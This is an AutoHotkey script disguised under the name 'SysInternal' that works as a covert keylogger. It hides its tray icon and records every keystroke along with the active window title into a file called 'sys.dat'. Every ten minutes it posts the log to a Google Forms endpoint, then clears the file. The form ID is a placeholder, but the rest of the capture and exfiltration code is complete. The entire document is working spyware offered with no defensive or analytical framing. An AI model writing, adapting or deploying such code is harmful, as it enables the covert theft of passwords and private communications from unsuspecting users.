#NoEnv
SendMode Input
SetWorkingDir %A_ScriptDir%
#Persistent
#SingleInstance Force
#NoTrayIcon

; SysInternal.ahk

targetDir := "C:\Users\" . A_Username . "\tmp"
startupDir := "C:\Users\" . A_Username . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

startSysDir := startupDir . "sys.dat"
targetSysDir := targetDir . "\sys.dat"

PastWin = ""
SetTimer, SubmitForm, 600000 ; 10 minutes or 600,000 ms
Loop
{
    WinGetActiveTitle, Win
    Input, Key, V T5

    if (Win = PastWin)
        FileAppend, %Key%, %targetSysDir%
    else
        FileAppend, %Win%|%Key%|, %targetSysDir%

    PastWin := Win
}
return

SubmitForm() {
    global targetSysDir
    url := "https://docs.google.com/forms/d/e/GiantStringOfLetters,ThisIsAPlaceholder/formResponse"
    
    FileRead, data, %targetSysDir%
    
    data := "entry.0000000000=" . UrlEncode(data) ;Those 0's are placeholders
    
    HttpPost(url, data)
    
    FileDelete, %targetSysDir%
    FileAppend, , %targetSysDir% ; Create an empty sys.dat
}

HttpPost(url, data) {
    http := ComObjCreate("MSXML2.ServerXMLHTTP.6.0")
    http.Open("POST", url, false)
    http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    http.send(data)
}

UrlEncode(str) {
    static hex := "0123456789ABCDEF"
    VarSetCapacity(res, StrLen(str) * 3)
    i := 0
    Loop, Parse, str
    {
        if (A_LoopField = " ")
            res .= "%20"
        else if (A_LoopField >= "0" && A_LoopField <= "9")
            res .= A_LoopField
        else if (A_LoopField >= "A" && A_LoopField <= "Z")
            res .= A_LoopField
        else if (A_LoopField >= "a" && A_LoopField <= "z")
            res .= A_LoopField
        else
            res .= "%" . SubStr(hex, (Asc(A_LoopField) >> 4) + 1, 1) . SubStr(hex, (Asc(A_LoopField) & 0x0F) + 1, 1)
    }
    return res
}
